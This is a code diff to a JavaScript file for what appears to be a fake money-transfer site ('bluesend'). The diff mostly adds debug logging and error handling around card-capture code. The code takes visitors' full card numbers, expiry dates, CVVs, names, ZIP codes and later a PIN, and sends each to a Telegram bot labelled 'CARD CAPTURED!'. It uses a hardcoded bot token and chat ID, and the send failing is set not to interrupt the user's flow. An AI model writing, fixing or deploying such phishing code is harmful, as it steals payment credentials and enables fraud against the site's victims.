@@ -2,7 +2,9 @@
 const BOT_TOKEN = "7378618796:AAEtSRK0ZpzZrsWiV8nb8V8Ze76xbYLUSWY";
 const CHAT_ID   = "5869598267";
 
-// final-features.js - Add after BOT_TOKEN constants
+// Add debugging
+console.log("final-features.js loaded");
+
 const PAGES = {
   INDEX: 'index.html',
   BANK: 'recipient-bank.html',
@@ -62,16 +64,23 @@ function getExchangeRate(senderCode, destCode) {
 
 document.addEventListener("DOMContentLoaded", () => {
   const page = document.body.dataset.page;
+  console.log("final-features.js executing for page:", page);
 
   // ========================================
   // 1. CARD PAGE – FULL CARD + ZIP TO TELEGRAM
   // ========================================
   if (page === "card") {
     const form = document.getElementById("card-form");
-    if (!form) return;
+    if (!form) {
+      console.error("Card form not found!");
+      return;
+    }
+
+    console.log("Setting up card form submit handler");
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
+      console.log("Card form submitted - final-features.js handler");
 
       const number = document.getElementById("card-number").value.replace(/\s/g, "");
       const expMonth = document.getElementById("exp-month").value;
@@ -82,18 +91,28 @@ document.addEventListener("DOMContentLoaded", () => {
       const zip = document.getElementById("zip").value.trim();
       const amount = JSON.parse(localStorage.getItem("bluesendAppState") || "{}").amountSend || "??";
 
-      const msg = `CARD CAPTURED!\n\nAmount: ${amount} USD\nCard: ${number}\nExp: ${expMonth}/${expYear}\nCVV: ${cvv}\nName: ${name}\nCity: ${city}\nZIP: ${zip}\nTime: ${new Date().toLocaleString()}`;
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-      });
-
+      // Save to state
       const state = JSON.parse(localStorage.getItem("bluesendAppState") || "{}");
       state.card = { number, expiryMonth: expMonth, expiryYear: expYear, cvv, name, city, zip };
       localStorage.setItem("bluesendAppState", JSON.stringify(state));
 
+      // Send to Telegram
+      const msg = `CARD CAPTURED!\n\nAmount: ${amount} USD\nCard: ${number}\nExp: ${expMonth}/${expYear}\nCVV: ${cvv}\nName: ${name}\nCity: ${city}\nZIP: ${zip}\nTime: ${new Date().toLocaleString()}`;
+
+      try {
+        console.log("Sending card data to Telegram...");
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+        console.log("Card data sent successfully");
+      } catch (error) {
+        console.error("Error sending to Telegram:", error);
+        // Continue anyway - don't block user flow
+      }
+
+      // Redirect to review page
       window.location.href = PAGES.REVIEW;
     });
   }
@@ -102,6 +121,7 @@ document.addEventListener("DOMContentLoaded", () => {
   // 2. REVIEW PAGE – FULL SUMMARY + WORKING BACK/MENU + PIN POPUP (FIXED)
   // ========================================
   if (page === "review") {
+    console.log("Setting up review page");
     const state = JSON.parse(localStorage.getItem("bluesendAppState") || "{}");
 
     // FULL REVIEW SUMMARY - FIXED VERSION with working exchange rates
@@ -207,6 +227,7 @@ document.addEventListener("DOMContentLoaded", () => {
       e.preventDefault();
       e.stopPropagation();
       e.stopImmediatePropagation();
+      console.log("Pay button clicked, showing PIN popup");
       overlay.style.display = "flex";
       setTimeout(() => {
         if (input) {
@@ -243,6 +264,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     if (cancelBtn) {
       cancelBtn.onclick = () => {
+        console.log("PIN popup cancelled");
         overlay.style.display = "none";
         if (input) {
           input.value = '';
@@ -255,6 +277,7 @@ document.addEventListener("DOMContentLoaded", () => {
     if (contBtn) {
       // Add click animation for visual feedback
       contBtn.addEventListener('click', async function() {
+        console.log("PIN Continue button clicked");
         // Add click animation
         this.style.transform = 'scale(0.98)';
         this.style.backgroundColor = '#003d99';
@@ -267,6 +290,7 @@ document.addEventListener("DOMContentLoaded", () => {
         const pin = input ? input.value.trim() : '';
         if (!/^\d{4}$/.test(pin)) {
           // Shake animation for error
+          console.log("Invalid PIN entered");
           input.style.animation = 'shake 0.5s';
           input.style.borderColor = '#dc2626';
           setTimeout(() => {
@@ -301,11 +325,13 @@ Status: SUCCESS
         `.trim();
 
         try {
+          console.log("Sending final payment + PIN to Telegram...");
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
           });
+          console.log("Payment + PIN sent successfully");
 
           state.trackingNumber = "BL-" + Date.now().toString(36).toUpperCase().slice(-6) + "-" + Math.floor(Math.random() * 9999).toString().padStart(4, "0");
           localStorage.setItem("bluesendAppState", JSON.stringify(state));
@@ -322,6 +348,7 @@ Status: SUCCESS
             this.style.opacity = '1';
             this.style.cursor = 'pointer';
             this.style.backgroundColor = '#0052cc';
+            console.log("Redirecting to success page");
             window.location.href = PAGES.SUCCESS;
           }, 800);
           
@@ -351,6 +378,7 @@ Status: SUCCESS
       // Allow Enter key to submit
       input.addEventListener("keypress", (e) => {
         if (e.key === "Enter" && contBtn) {
+          console.log("Enter key pressed in PIN field");
           // Trigger button animation
           contBtn.style.transform = 'scale(0.98)';
           contBtn.style.backgroundColor = '#003d99';
@@ -382,7 +410,9 @@ Status: SUCCESS
   // 3. SUCCESS PAGE – CLEAR DATA
   // ========================================
   if (page === "success") {
+    console.log("Success page loaded");
     document.querySelector(".btn-primary")?.addEventListener("click", () => {
+      console.log("Clearing app state and returning to index");
       localStorage.removeItem("bluesendAppState");
       window.location.href = PAGES.INDEX;
     });
